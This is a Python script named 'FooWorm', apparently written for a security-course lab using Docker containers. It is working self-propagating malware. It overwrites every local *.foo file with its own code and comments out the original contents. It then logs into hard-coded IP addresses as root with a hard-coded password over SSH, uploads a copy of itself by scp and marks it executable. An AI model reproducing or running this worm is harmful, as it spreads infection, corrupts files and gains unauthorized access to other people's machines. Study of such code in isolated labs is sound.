#!/usr/bin/env python

### FooWorm

import sys
import os
import paramiko
import scp
import glob

# 1805052_1.py

# infect all the *.foo files in current machine
IN = open(sys.argv[0], 'r')
virus = [line for (i,line) in enumerate(IN)]

# infect all *.foo files in this machine
for item in glob.glob("*.foo"):
    IN = open(item, 'r')
    all_of_it = IN.readlines()
    IN.close()
    if any('foovirus' in line for line in all_of_it): continue
    os.chmod(item, 0o777)    
    OUT = open(item, 'w')
    OUT.writelines(virus)
    all_of_it = ['#' + line for line in all_of_it]
    OUT.writelines(all_of_it)
    OUT.close()


container_username='root'
container_pass='mypassword'
target_host=['172.17.0.11', '172.17.0.10'] # container 10 and 9

# upload this virus to these machines
for ip_address in target_host:
    print("\nTrying password %s for user %s at IP address: %s" % (container_pass,container_username,ip_address))
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip_address,port=22,username=container_username,password=container_pass,timeout=5)
        print("\nconnected")
        # Let's make sure that the target host was not previously 
        # infected:
        received_list = error = None
        stdin, stdout, stderr = ssh.exec_command('ls')
        error = stderr.readlines()
        if error: 
            print(error)
        received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
        print("\noutput of 'ls' command: %s" % str(received_list))

        if f"{sys.argv[0]}\n".encode() in received_list:
            print("\nThe target machine is already infected")
            continue
    
        # Now we can infect the host with virus
        # 1st take control of the command prompt
        scpcon = scp.SCPClient(ssh.get_transport()) # open a scp1 connection to download and upload files

        # Now deposit a copy of the this virus file at the target host:
        print(f"uploding file {sys.argv[0]} to {ip_address}")
        scpcon.put(sys.argv[0])   

        # also make it executable
        stdin, stdout, stderr = ssh.exec_command(f'chmod +x {sys.argv[0]}')
        error = stderr.readlines()
        if error: 
            print(error)   
               
        scpcon.close()
        print(f"A copy of {sys.argv[0]} is saved in the target host wih execution permission")
    except:
        continue

